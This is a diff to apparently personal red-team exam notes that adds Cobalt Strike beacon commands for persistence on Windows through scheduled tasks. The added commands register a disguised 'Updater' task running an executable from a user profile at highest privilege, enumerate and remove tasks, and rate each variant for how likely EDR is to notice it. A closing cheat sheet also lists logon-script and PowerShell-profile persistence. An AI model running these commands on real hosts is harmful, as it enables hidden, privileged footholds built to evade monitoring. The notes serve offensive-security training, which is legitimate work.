@@ -206,14 +206,34 @@ Task Scheduler supports triggers: logon, startup, idle, time, system event.
 ```cs
 // Upload XML to target, then create task
 beacon> upload C:\Payloads\task.xml
-beacon> schtasks create \Beacon XML CREATE
-// File dialogue → select task.xml
+beacon> shell schtasks /create /tn \Beacon /xml task.xml     // OPSEC-UNSAFE — spawns cmd.exe
+beacon> run schtasks /create /tn \Beacon /xml task.xml       // OPSEC-CAUTION — no cmd.exe, still spawns proc
 // Task name must start with \
 ```
 
+**OPSEC-SAFE alternative — COM object via powerpick (no schtasks.exe, no child process):**
+```cs
+beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe'; Register-ScheduledTask -TaskName 'Updater' -Action $action -RunLevel Highest
+```
+
+**OPSEC-SAFE enumeration alternatives:**
+```cs
+// Seatbelt via execute-assembly (in-memory, no child process)
+beacon> execute-assembly Seatbelt.exe ScheduledTasks
+
+// powerpick (no powershell.exe spawned)
+beacon> powerpick Get-ScheduledTask | Select TaskName,TaskPath,State | Format-List
+```
+
+> **Event IDs generated on task creation:** `4698` (Task Scheduler created a task) — logged on the local host.
+> `schtasks.exe` spawned as a child of beacon is high-confidence EDR telemetry. Prefer `powerpick`/`execute-assembly` path in exam.
+
 **Remove:**
 ```cs
-beacon> schtasks delete \Beacon
+beacon> shell schtasks /delete /tn \Beacon /f               // OPSEC-UNSAFE
+beacon> run schtasks /delete /tn \Beacon /f                 // OPSEC-CAUTION
+// OPSEC-SAFE remove:
+beacon> powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false
 ```
 
 ---
@@ -247,9 +267,14 @@ LOGON SCRIPT:  reg_set HKCU Environment UserInitMprLogonScript REG_SZ <exe_path>
 
 PS PROFILE:    upload profile.ps1 → mv to Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 
-SCHED TASK:    upload task.xml → schtasks create \Beacon XML CREATE
+SCHED TASK:    upload task.xml → shell schtasks /create /tn \Beacon /xml task.xml  [UNSAFE]
+               run schtasks /create /tn \Beacon /xml task.xml                        [CAUTION]
+               powerpick Register-ScheduledTask ...                                  [SAFE]
+
+ENUM TASK:     execute-assembly Seatbelt.exe ScheduledTasks                         [SAFE]
+               powerpick Get-ScheduledTask | Select TaskName,TaskPath,State          [SAFE]
 
 REMOVE COM:    reg_delete HKCU Software\Classes\CLSID\{GUID}
 REMOVE RUN:    reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run <name>
-REMOVE TASK:   schtasks delete \Beacon
+REMOVE TASK:   shell schtasks /delete /tn \Beacon /f  [UNSAFE] | powerpick Unregister-ScheduledTask -TaskName 'Updater' -Confirm:$false  [SAFE]
 ```
